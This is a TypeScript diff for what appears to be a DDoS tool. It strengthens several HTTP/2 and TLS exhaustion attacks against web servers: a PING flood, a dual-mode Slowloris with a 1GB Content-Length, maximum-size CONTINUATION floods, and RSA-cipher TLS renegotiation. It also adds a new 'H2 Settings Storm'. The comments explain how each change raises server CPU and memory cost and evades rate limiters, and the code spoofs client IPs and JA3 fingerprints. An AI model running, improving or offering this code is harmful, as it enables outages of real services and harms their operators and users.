@@ -675,6 +675,7 @@ async function runHTTP2Flood(
         const conn = c;
         const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
 
+        let pumpCount = 0;
         const pump = () => {
           if (signal.aborted || conn.destroyed) { resolve(); return; }
           for (let burst = 0; burst < 64 && !signal.aborted && !conn.destroyed; burst++) {
@@ -705,6 +706,22 @@ async function runHTTP2Flood(
               localBytes += 400;
               stream.on("error", () => { /**/ });
             } catch { break; }
+          }
+          // ★ PING FLOOD: every 4 bursts (≈256 RST streams) inject 12 PING frames.
+          // RFC 7540 §6.7: server MUST send PING ACK for every PING received.
+          // 12 mandatory ACKs per 256 RST_STREAMs compounds CPU: server is
+          // simultaneously processing RST queue + generating ACK responses.
+          pumpCount++;
+          if (pumpCount % 4 === 0 && !conn.destroyed) {
+            for (let p = 0; p < 12; p++) {
+              try {
+                const pingData = Buffer.allocUnsafe(8);
+                pingData.writeUInt32BE(randInt(0, 0x7fffffff), 0);
+                pingData.writeUInt32BE(randInt(0, 0x7fffffff), 4);
+                conn.ping(pingData, () => { /* ACK received — we don't care, server had to work */ });
+              } catch { /**/ }
+            }
+            localPkts += 12; localBytes += 12 * 17; // 9-byte frame header + 8-byte payload each
           }
           if (!signal.aborted && !conn.destroyed) setImmediate(pump);
         };
@@ -783,33 +800,76 @@ async function runSlowlorisReal(
     const onConnected = () => {
       activeConns++;
       localPkts++;
-      // Partial GET — intentionally missing the final \r\n\r\n
-      const partial = [
-        `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
-        `Host: ${hostname}`,
-        `User-Agent: ${randUA()}`,
-        `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
-        `Accept-Language: en-US,en;q=0.9`,
-        `Accept-Encoding: gzip, deflate`,
-        `X-Forwarded-For: ${randIp()}`,
-        `Connection: keep-alive`,
-        `Referer: https://google.com/`,
-        ``, // NO final \r\n\r\n — this is the Slowloris trick
-      ].join("\r\n");
 
-      sock.write(partial);
-      localBytes += partial.length;
+      // ★ DUAL-MODE SLOWLORIS:
+      // 60% classic GET Slowloris (missing final \r\n\r\n — server waits for request completion)
+      // 40% POST Slowloris (sends huge Content-Length, server waits for body to arrive byte by byte)
+      //
+      // POST variant exploits: server allocates a body buffer of Content-Length size, then waits.
+      // Apache + nginx buffer the body before handing to app — 1GB Content-Length = 1GB reserved.
+      // Even body-streaming servers keep the connection slot open until Content-Length bytes received.
+      const usePost = Math.random() < 0.4;
 
-      // Trickle a junk header every 10-25s to prevent server timeout
-      keepIv = setInterval(() => {
-        if (signal.aborted || sock.destroyed) { cleanup(); return; }
-        const hdr = `X-${randStr(5)}-${randStr(3)}: ${randStr(randInt(8, 20))}\r\n`;
-        sock.write(hdr, (err) => {
-          if (err) { cleanup(); return; }
-          localPkts++;
-          localBytes += hdr.length;
-        });
-      }, randInt(10_000, 25_000));
+      if (usePost) {
+        // POST Slowloris: complete HTTP headers, 1GB Content-Length, trickle body bytes slowly
+        const postHeaders = [
+          `POST ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
+          `Host: ${hostname}`,
+          `User-Agent: ${randUA()}`,
+          `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
+          `Accept-Language: en-US,en;q=0.9`,
+          `Accept-Encoding: gzip, deflate`,
+          `X-Forwarded-For: ${randIp()}`,
+          `Connection: keep-alive`,
+          `Content-Type: application/x-www-form-urlencoded`,
+          `Content-Length: 1073741824`, // 1GB — server waits for this many bytes
+          `\r\n`, // complete headers — server now waits for 1GB of body
+        ].join("\r\n");
+
+        sock.write(postHeaders);
+        localBytes += postHeaders.length;
+
+        // Trickle body bytes every 10-25s — never completes, holds connection open
+        keepIv = setInterval(() => {
+          if (signal.aborted || sock.destroyed) { cleanup(); return; }
+          // Send 1-4 bytes of random body data — looks like real slow upload
+          const bodyChunk = `${randStr(randInt(1, 4))}`;
+          sock.write(bodyChunk, (err) => {
+            if (err) { cleanup(); return; }
+            localPkts++;
+            localBytes += bodyChunk.length;
+          });
+        }, randInt(8_000, 20_000)); // slightly faster trickle to stay alive longer
+
+      } else {
+        // Classic GET Slowloris — intentionally missing the final \r\n\r\n
+        const partial = [
+          `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
+          `Host: ${hostname}`,
+          `User-Agent: ${randUA()}`,
+          `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
+          `Accept-Language: en-US,en;q=0.9`,
+          `Accept-Encoding: gzip, deflate`,
+          `X-Forwarded-For: ${randIp()}`,
+          `Connection: keep-alive`,
+          `Referer: https://google.com/`,
+          ``, // NO final \r\n\r\n — this is the Slowloris trick
+        ].join("\r\n");
+
+        sock.write(partial);
+        localBytes += partial.length;
+
+        // Trickle a junk header every 10-25s to prevent server timeout
+        keepIv = setInterval(() => {
+          if (signal.aborted || sock.destroyed) { cleanup(); return; }
+          const hdr = `X-${randStr(5)}-${randStr(3)}: ${randStr(randInt(8, 20))}\r\n`;
+          sock.write(hdr, (err) => {
+            if (err) { cleanup(); return; }
+            localPkts++;
+            localBytes += hdr.length;
+          });
+        }, randInt(10_000, 25_000));
+      }
     };
 
     // TLS emits 'secureConnect', plain TCP emits 'connect'
@@ -1485,15 +1545,20 @@ async function runH2Continuation(
     ]);
   };
 
-  // CONTINUATION payload — random header bytes (server must parse/buffer all of them)
+  // CONTINUATION payload — fills each frame with 8–16 KB of garbage header data.
+  // HTTP/2 spec (RFC 7540 §6.10) mandates the server buffer ALL CONTINUATION frames
+  // for a stream before delivering to the app layer. Max frame size is 16384 bytes.
+  // Increasing from 128-512B → 8192-16384B = 32× more RAM allocated per stream.
+  // Server cannot reject mid-stream — it must buffer until END_HEADERS or connection reset.
   const makeCont = (streamId: number): Buffer => {
-    const payload = Buffer.allocUnsafe(randInt(128, 512));
-    for (let i = 0; i < payload.length; i++) payload[i] = randInt(0, 256);
+    const payload = Buffer.allocUnsafe(randInt(8192, 16384)); // was 128-512 — now max allowed
+    for (let i = 0; i < payload.length; i += 4)
+      payload.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i); // random data, faster than byte loop
     return mkFrame(0x09, 0x00, streamId, payload); // type 0x09 = CONTINUATION, flags=0 (no END_HEADERS)
   };
 
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 300);
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 400); // +100 prod slots
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -1525,15 +1590,22 @@ async function runH2Continuation(
         sock.write(mkFrame(0x01, 0x01, streamId, hpack)); // 0x01=HEADERS, 0x01=END_STREAM only
         localPkts++; localBytes += 9 + hpack.length;
 
-        // Flood CONTINUATION frames — server buffers all of them
-        const burst = randInt(50, 200);
+        // Flood CONTINUATION frames — server buffers all of them (8–16KB per frame)
+        // Burst range 100–2000 → worst case: 2000 × 16384B = 32MB allocated per stream cycle
+        const burst = randInt(100, 2000);
         for (let i = 0; i < burst; i++) {
           const cf = makeCont(streamId);
           sock.write(cf);
           localPkts++; localBytes += cf.length;
         }
 
-        streamId = (streamId + 2) > 0x7fffffff ? 1 : streamId + 2; // odd IDs for client
+        // Wrap at 0x7FFFFF00 to avoid approaching the protocol limit (0x7FFFFFFF)
+        // RFC 7540: stream IDs MUST be monotonically increasing — never reset to 1 on same connection
+        if (streamId > 0x7FFFFF00) {
+          // Approaching stream ID limit — close and reconnect in next slot iteration
+          sock.destroy(); done(); return;
+        }
+        streamId += 2; // always odd for client
         setImmediate(attack);
       };
       attack();
@@ -1580,11 +1652,28 @@ async function runTLSRenego(
   const runSlot = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
+    // ★ RSA cipher priority: prioritize cipher suites WITHOUT forward secrecy (ECDHE/DHE prefix).
+    // Non-FS ciphers (AES256-GCM-SHA384, AES128-GCM-SHA256, etc.) use RSA key exchange.
+    // TLS 1.2 RSA handshake: server must decrypt ClientKeyExchange with its RSA private key (~1ms
+    // asymmetric op). ECDHE handshake: server does fast ECC multiply instead (~0.1ms). RSA is ~10×
+    // more expensive — prioritizing these ciphers multiplies server CPU cost per renegotiation.
+    // Non-FS first, then ECDHE fallback so we still connect if RSA-only is unsupported.
+    const RSA_PRIORITY_CIPHERS = [
+      "AES256-GCM-SHA384",          // RSA key exchange, no FS — most expensive per handshake
+      "AES128-GCM-SHA256",          // RSA key exchange, no FS
+      "AES256-SHA256",              // RSA key exchange, CBC mode
+      "AES128-SHA256",              // RSA key exchange, CBC mode
+      "AES256-SHA",                 // RSA key exchange, older CBC
+      "AES128-SHA",                 // RSA key exchange, older CBC
+      "ECDHE-RSA-AES256-GCM-SHA384",// ECDHE fallback (server may reject non-FS first)
+      "ECDHE-RSA-AES128-GCM-SHA256",// ECDHE fallback
+    ].join(":");
+
     const sock = tls.connect({
       host: resolvedHost, port: targetPort,
       servername: hostname, rejectUnauthorized: false,
       maxVersion: "TLSv1.2" as tls.SecureVersion, // force TLS 1.2 — renegotiation requires it
-      ciphers: "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:AES256-SHA:AES128-SHA",
+      ciphers: RSA_PRIORITY_CIPHERS,
     });
     sock.setTimeout(60_000);
 
@@ -1596,9 +1685,10 @@ async function runTLSRenego(
       try {
         sock.renegotiate({ rejectUnauthorized: false }, (err) => {
           if (err || signal.aborted) { try { sock.destroy(); } catch { /**/ } done(); return; }
-          localPkts++; localBytes += 1400; // ~1.4KB per TLS handshake
-          // 5 renegotiations/sec per slot — sustained CPU exhaustion
-          setTimeout(doRenego, 200);
+          localPkts++; localBytes += 2800; // ~2.8KB RSA TLS handshake (larger than ECDHE)
+          // ★ Randomized 50–150ms interval (was fixed 200ms) → 7–20 renegotiations/sec per slot
+          // Random timing also defeats per-second rate limiters that expect fixed intervals.
+          setTimeout(doRenego, randInt(50, 150));
         });
       } catch { done(); }
     };
@@ -1607,7 +1697,7 @@ async function runTLSRenego(
       // Initial keepalive request so server doesn't close idle connection
       sock.write(`HEAD / HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n\r\n`);
       localPkts++; localBytes += 60;
-      setTimeout(doRenego, 300);
+      setTimeout(doRenego, 100); // start renegotiation sooner (was 300ms)
     });
 
     sock.on("data",    () => {});
@@ -1615,6 +1705,161 @@ async function runTLSRenego(
     sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 300); });
     sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 150); });
     signal.addEventListener("abort", () => { try { sock.destroy(); } catch { /**/ } done(); }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  H2 SETTINGS STORM
+//
+//  Attack in 3 simultaneous layers on each H2 connection:
+//
+//  Layer 1 — SETTINGS_HEADER_TABLE_SIZE storm:
+//    Rapidly alternate HPACK table size 0 ↔ 65536. RFC 7541 §4.2: when size
+//    decreases, the server MUST evict dynamic table entries until the table fits.
+//    HPACK table size = 0 → server clears entire dynamic table.
+//    HPACK table size = 65536 → server re-enables full 64KB table.
+//    Each change triggers mandatory table eviction + state bookkeeping.
+//    At 100+ changes/sec, server is locked in constant alloc/clear/alloc cycles.
+//
+//  Layer 2 — Half-open stream accumulation:
+//    Open OPEN_STREAMS half-open streams (HEADERS without END_STREAM).
+//    Server allocates state for each (goroutine / worker slot / connection context).
+//    These streams block server resources while the SETTINGS storm runs.
+//
+//  Layer 3 — WINDOW_UPDATE flood on every open stream:
+//    Repeatedly send WINDOW_UPDATE frames on all open streams + connection.
+//    Server must process each to update its send flow-control state per stream.
+//    RFC 7540 §6.9: each WINDOW_UPDATE triggers per-stream recalculation.
+//
+//  DEV: 60 slots | PROD: 400 slots
+// ─────────────────────────────────────────────────────────────────────────
+async function runH2SettingsStorm(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 400);
+  const OPEN_STREAMS = IS_DEV ? 20 : 50; // half-open streams per connection
+
+  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
+    const f = Buffer.allocUnsafe(9 + payload.length);
+    f[0] = (payload.length >>> 16) & 0xff;
+    f[1] = (payload.length >>>  8) & 0xff;
+    f[2] = (payload.length       ) & 0xff;
+    f[3] = type; f[4] = flags;
+    f.writeUInt32BE(streamId & 0x7fffffff, 5);
+    payload.copy(f, 9);
+    return f;
+  };
+
+  const PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+  const SACK    = mkFrame(0x04, 0x01, 0, Buffer.alloc(0)); // SETTINGS ACK
+
+  // SETTINGS frame with single SETTINGS_HEADER_TABLE_SIZE (id=0x0001) param
+  const mkSettingsHTS = (tableSize: number): Buffer => {
+    const p = Buffer.allocUnsafe(6);
+    p.writeUInt16BE(0x0001, 0); // SETTINGS_HEADER_TABLE_SIZE
+    p.writeUInt32BE(tableSize, 2);
+    return mkFrame(0x04, 0x00, 0, p);
+  };
+
+  const SETTINGS_CLEAR = mkSettingsHTS(0);     // clears HPACK dynamic table entirely
+  const SETTINGS_FULL  = mkSettingsHTS(65536); // restores 64KB HPACK table
+
+  // WINDOW_UPDATE frame: stream 0 (connection) or stream N
+  const mkWU = (streamId: number, increment: number): Buffer => {
+    const p = Buffer.allocUnsafe(4);
+    p.writeUInt32BE(increment & 0x7fffffff, 0);
+    return mkFrame(0x08, 0x00, streamId, p);
+  };
+
+  // HEADERS frame WITHOUT END_STREAM — opens a stream that server must keep alive
+  const mkOpenHeaders = (sid: number): Buffer => {
+    const hBuf = Buffer.from(hostname);
+    const hpack = Buffer.concat([
+      Buffer.from([0x82, 0x84, 0x87]),     // :method GET, :path /, :scheme https (indexed)
+      Buffer.from([0x41, hBuf.length]), hBuf, // :authority literal incremental-index
+    ]);
+    return mkFrame(0x01, 0x04, sid, hpack); // 0x04 = END_HEADERS only (no END_STREAM)
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSlot = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+
+    const sock = tls.connect({
+      host: resolvedHost, port: targetPort,
+      servername: hostname, rejectUnauthorized: false,
+      ALPNProtocols: ["h2"],
+      ciphers: randomJA3Ciphers(),
+    });
+    sock.setTimeout(30_000);
+    let settled = false;
+    const done  = () => { if (!settled) { settled = true; resolve(); } };
+
+    sock.once("secureConnect", () => {
+      // Send client preface + initial SETTINGS (full table) + ACK
+      sock.write(Buffer.concat([PREFACE, SETTINGS_FULL, SACK]));
+      localPkts++; localBytes += PREFACE.length + SETTINGS_FULL.length + SACK.length;
+
+      // Open OPEN_STREAMS half-open streams (no END_STREAM → server holds them open)
+      let topStreamId = 1;
+      for (let i = 0; i < OPEN_STREAMS; i++) {
+        const f = mkOpenHeaders(topStreamId);
+        sock.write(f);
+        localPkts++; localBytes += f.length;
+        topStreamId += 2;
+      }
+
+      // Also expand connection-level window to max so server can send data
+      const connWU = mkWU(0, 0x3fffffff);
+      sock.write(connWU);
+      localPkts++; localBytes += 13;
+
+      // Storm loop — run as fast as the event loop allows
+      let toggle = false;
+      const storm = () => {
+        if (signal.aborted || sock.destroyed) { done(); return; }
+
+        // Layer 1: alternate SETTINGS_HEADER_TABLE_SIZE (clear ↔ full)
+        // Each change forces server to evict/restore entire HPACK dynamic table
+        const settings = toggle ? SETTINGS_CLEAR : SETTINGS_FULL;
+        toggle = !toggle;
+        sock.write(settings);
+        localPkts++; localBytes += settings.length;
+
+        // Layer 3: WINDOW_UPDATE on every open stream + connection
+        // Moderate increment (8192) to stay well below the 2^31-1 overflow boundary
+        for (let sid = 1; sid < topStreamId; sid += 2) {
+          const wu = mkWU(sid, 8192);
+          sock.write(wu);
+          localPkts++; localBytes += 13;
+        }
+        const cWU = mkWU(0, 8192);
+        sock.write(cWU);
+        localPkts++; localBytes += 13;
+
+        setImmediate(storm);
+      };
+      storm();
+    });
+
+    sock.on("data",    () => {}); // drain server SETTINGS ACKs + RST_STREAMs
+    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
+    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
+    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
+    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
   });
 
   await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
@@ -2443,6 +2688,10 @@ async function runWorker() {
   } else if (cfg.method === "hpack-bomb") {
     // HPACK Bomb — HTTP/2 dynamic table exhaustion via incremental-indexed headers
     await runHPACKBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "h2-settings-storm") {
+    // H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE flood
+    await runH2SettingsStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
